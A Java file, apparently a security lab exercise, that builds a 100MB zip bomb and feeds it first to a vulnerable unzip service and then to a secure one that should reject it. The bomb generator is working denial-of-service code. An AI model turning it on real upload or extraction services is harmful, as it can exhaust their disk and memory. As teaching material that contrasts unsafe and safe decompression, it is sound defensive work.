import java.io.*;
import java.util.zip.*;

public class ZipBombExploit {
    public static void main(String[] args) throws IOException {
        System.out.println("=== Lab 1-1: Denial of Service (Zip Bomb) ===\n");

        File tmpDir = new File("tmp_extract");
        tmpDir.mkdir();

        // Step 1: Create a "Zip Bomb"
        // We'll create a single entry with highly repetitive data that compresses very
        // well.
        // A 100MB file of 'A's compresses to just a few kilobytes.
        byte[] bombData = createZipBomb(1024 * 1024 * 100); // 100MB uncompressed
        System.out.println("Created Zip Bomb: 100MB of data compressed into " + bombData.length + " bytes.");

        // Step 2: Try with Vulnerable Service (Simulated - we stop early to avoid disk
        // fill)
        System.out.println("\n[Step 1] Sending Zip Bomb to Vulnerable Service...");
        VulnerableZipService vulnerableService = new VulnerableZipService();
        try {
            // In a real exploit, this would fill the disk.
            // We'll just demonstrate it starts.
            vulnerableService.unzip(new ByteArrayInputStream(bombData), tmpDir);
            System.out.println("[!] Vulnerable Service finished (Disk might be full!)");
        } catch (Exception e) {
            System.err.println("Vulnerable Service error: " + e.getMessage());
        }

        // Cleanup
        deleteDirectory(tmpDir);
        tmpDir.mkdir();

        // Step 3: Try with Secure Service
        System.out.println("\n[Step 2] Sending Zip Bomb to Secure Service...");
        SecureZipService secureService = new SecureZipService();
        try {
            secureService.unzip(new ByteArrayInputStream(bombData), tmpDir, bombData.length);
            System.out.println("[+] Secure Service finished successfully.");
        } catch (IOException e) {
            System.out.println("[+] Secure Service successfully blocked the zip bomb: " + e.getMessage());
        }

        deleteDirectory(tmpDir);
    }

    private static byte[] createZipBomb(int size) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ZipOutputStream zos = new ZipOutputStream(baos)) {
            ZipEntry entry = new ZipEntry("bomb.txt");
            zos.putNextEntry(entry);
            byte[] block = new byte[1024 * 64]; // 64KB block
            for (int i = 0; i < size; i += block.length) {
                zos.write(block);
            }
            zos.closeEntry();
        }
        return baos.toByteArray();
    }

    private static void deleteDirectory(File dir) {
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory())
                    deleteDirectory(file);
                else
                    file.delete();
            }
        }
        dir.delete();
    }
}
